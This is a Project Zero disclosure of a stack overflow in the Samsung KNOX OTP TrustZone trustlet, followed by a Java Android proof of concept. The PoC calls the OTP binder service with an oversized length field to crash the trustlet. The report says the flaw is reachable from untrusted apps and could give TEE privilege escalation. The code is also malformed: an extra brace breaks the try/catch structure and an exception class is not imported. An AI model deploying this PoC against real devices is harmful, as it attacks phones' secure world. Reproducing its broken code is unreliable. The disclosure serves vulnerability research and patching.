/**
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=938

As a part of the KNOX extensions available on Samsung devices, Samsung provides a TrustZone trustlet which allows the generation of OTP tokens.

The tokens themselves are generated in a TrustZone application within the TEE (UID: fffffffff0000000000000000000001e), which can be communicated with using the "OTP" service, published by "otp_server".

Many of the internal commands supported by the trustlet must either unwrap or wrap a token. They do so by calling the functions "otp_unwrap" and "otp_wrap", correspondingly.

Both functions copy the internal token data to a local stack based buffer before attempting to wrap or unwrap it. However, this copy operation is performed using a length field supplied in the user's buffer (the length field's offset changes according to the calling code-path), which is not validated at all.

This means an attacker can supply a length field larger than the stack based buffer, causing the user-controlled token data to overflow the stack buffer. There is no stack cookie mitigation in MobiCore trustlets.

On the device I'm working on (SM-G925V), the "OTP" service can be accessed from any user, including from the SELinux context "untrusted_app". Successfully exploiting this vulnerability should allow a user to elevate privileges to the TrustZone TEE.

I've attached a small PoC which can be used to trigger the overflow. It calls the OTP_GENERATE_OTP command with a large length field which overflows the trustlet's stack. Running it should crash OTP trustlet.
*/

package com.example.laginimaineb.otp;

import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class OneWhoKNOX extends AppCompatActivity {

	/**
 	 * The logtag used.
	 */
	private static final String LOGTAG = "OTP_TEST";

	/**
 	 * The name of the OTP binder service.
	 */
	private static final String INTERFACE_DESCRIPTOR = "OTP";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		try {
			//Getting the binder
			Class smClass = Class.forName("android.os.ServiceManager");
			IBinder binder = (IBinder) smClass.getMethod("getService", String.class).invoke(null, INTERFACE_DESCRIPTOR);

			//Writing a command with a large length field
			Parcel parcel = Parcel.obtain();
			Parcel reply = Parcel.obtain();
			parcel.writeInterfaceToken(INTERFACE_DESCRIPTOR);
			byte[] command = new byte[0xDA7];

			//Setting the command to OTP_GENERATE_OTP
			command[0] = 0x02;
			command[1] = 0x00;
			command[2] = 0x00;
			command[3] = 0x00;

			//Setting the length field to something insane
			command[0x41C]     = (byte)0xFF;
			command[0x41C + 1] = (byte)0xFF;
			command[0x41C + 2] = (byte)0x00;
			command[0x41C + 3] = (byte)0x00;

			//Sending the command (should crash the trustlet)
			parcel.writeByteArray(command);
			binder.transact(2, parcel, reply, 0);
			Log.e(LOGTAG, "res=" + reply.readInt());
			reply.recycle();
			parcel.recycle();

		} catch (ClassNotFoundException |
			 NoSuchMethodException  |
			 IllegalAccessException |
			 InvocationTargetException ex) {
		    Log.e(LOGTAG, "Failed to dynamically load ServiceManager methods", ex);
		}

		} catch (RemoteException ex) {
		    Log.e(LOGTAG, "Failed to communicate with remote binder", ex);
		}
	}
}